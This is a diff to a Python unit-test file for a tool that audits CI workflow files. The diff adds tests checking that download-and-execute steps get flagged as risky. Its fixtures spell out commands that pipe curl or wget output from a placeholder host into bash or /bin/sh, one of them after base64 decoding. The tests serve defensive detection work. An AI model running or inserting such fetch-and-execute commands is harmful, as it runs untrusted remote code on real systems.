@@ -74,6 +74,18 @@ class RatchetTests(unittest.TestCase):
         )
         self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
 
+    def test_download_tee_pipe_bash_denied(self):
+        self.write("jobs:\n  x:\n    steps:\n      - run: |\n          curl -fsSL https://example.invalid/install.sh | tee payload.sh | bash\n")
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_download_decoder_pipe_shell_denied(self):
+        self.write("jobs:\n  x:\n    steps:\n      - run: |\n          wget -qO- https://example.invalid/i | base64 -d | /bin/sh\n")
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_non_execution_output_pipe_remains_unflagged(self):
+        self.write("jobs:\n  x:\n    steps:\n      - run: |\n          curl -fsSL https://example.invalid/i | tee source.txt\n")
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)
+
     def test_absolute_path_shell_pipeline_rejected(self):
         self.write("jobs:\n  x:\n    steps:\n      - run: curl -fsSL https://example.invalid/install | /bin/bash\n")
         self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
